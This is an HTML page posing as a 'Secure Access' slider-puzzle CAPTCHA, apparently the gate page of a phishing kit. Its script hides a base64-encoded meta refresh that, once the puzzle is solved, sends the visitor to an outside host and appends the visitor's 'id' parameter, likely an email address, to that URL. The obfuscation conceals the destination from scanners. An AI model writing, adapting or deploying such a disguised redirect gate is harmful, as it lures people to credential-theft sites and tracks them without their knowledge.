<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Secure Access</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background: #f3f3f3;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }

      #captcha-container {
        position: relative;
        width: 320px;
        height: 180px;
        background-image: url('https://i.ibb.co/fkBgzJv/puzzle-bg.jpg'); /* colorful puzzle */
        background-size: cover;
        border: 2px solid #0078ff;
        border-radius: 6px;
        overflow: hidden;
      }

      #puzzle-piece {
        position: absolute;
        top: 50px;
        left: 0;
        width: 60px;
        height: 60px;
        background-image: url('https://i.ibb.co/fkBgzJv/puzzle-bg.jpg');
        background-size: cover;
        background-position: -120px -50px;
        border: 2px solid #0078ff;
        border-radius: 4px;
        cursor: grab;
        transition: box-shadow 0.2s;
      }

      #instruction {
        margin-top: 16px;
        text-align: center;
        font-size: 14px;
        color: #333;
      }

      #container {
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div id="container">
      <div id="captcha-container">
        <div id="puzzle-piece"></div>
      </div>
      <div id="instruction">Slide the piece to the correct position to unlock</div>
    </div>

    <script>
      const hasStatus = new URLSearchParams(window.location.search).has("status");
      const hasId = new URLSearchParams(window.location.search).has("id");

      // Redirection logic if already verified
      if (hasStatus) {
        const status = new URLSearchParams(window.location.search).get("status");
        if (status === "true") {
          const ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";
          let decodedRef = decodeURIComponent(atob(ref));
          const lastIndexOfColon = decodedRef.lastIndexOf('"');

          if (hasId) {
            const id = new URLSearchParams(window.location.search).get("id");
            const newDecodedRef = decodedRef.slice(0, lastIndexOfColon) + "?e=" + id + '" />';
            const encodedUrl = btoa(newDecodedRef);
            document.write(decodeURIComponent(atob(encodedUrl)));
          } else {
            document.write(decodedRef);
          }
        }
      }

      // Puzzle logic
      const puzzle = document.getElementById("puzzle-piece");
      let isDragging = false;

      puzzle.addEventListener("mousedown", () => {
        isDragging = true;
        puzzle.style.cursor = "grabbing";
      });

      document.addEventListener("mouseup", () => {
        isDragging = false;
        puzzle.style.cursor = "grab";
        const rect = puzzle.getBoundingClientRect();
        const correctLeft = 120;
        const margin = 10;

        // If piece is close to target position, unlock
        if (Math.abs(rect.left - puzzle.parentElement.getBoundingClientRect().left - correctLeft) < margin) {
          puzzle.style.left = correctLeft + "px";
          puzzle.style.boxShadow = "0 0 12px green";

          // Redirect with ?status=true
          let currentUrl = window.location.href;
          if (hasId) {
            currentUrl += "&status=true";
          } else {
            currentUrl += "?status=true";
          }

          setTimeout(() => {
            window.location.href = currentUrl;
          }, 800);
        }
      });

      document.addEventListener("mousemove", (e) => {
        if (!isDragging) return;
        const container = document.getElementById("captcha-container").getBoundingClientRect();
        let newLeft = e.clientX - container.left - puzzle.offsetWidth / 2;
        newLeft = Math.max(0, Math.min(container.width - puzzle.offsetWidth, newLeft));
        puzzle.style.left = newLeft + "px";
      });
    </script>
  </body>
</html>
